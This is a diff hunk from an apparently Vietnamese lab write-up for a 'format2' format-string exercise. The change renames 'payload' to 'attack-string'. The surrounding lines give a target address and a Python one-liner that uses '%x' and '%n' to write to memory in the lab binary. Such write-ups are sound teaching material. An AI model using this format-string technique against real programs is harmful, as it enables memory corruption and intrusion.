@@ -34,7 +34,7 @@ printf(): hàm printf() không check liệu input có đúng định dạng hay 
 
 ## Exploit
 - Tương tự bài format1, tìm địa chỉ target: 0x080496e4
-- Xây dựng payload:
+- Xây dựng attack-string:
 ```
 python -c "print ('\xe4\x96\x04\x08' + '%x '*30+ '%n' + 'A'*500)[:500]" | ./format2
 ```
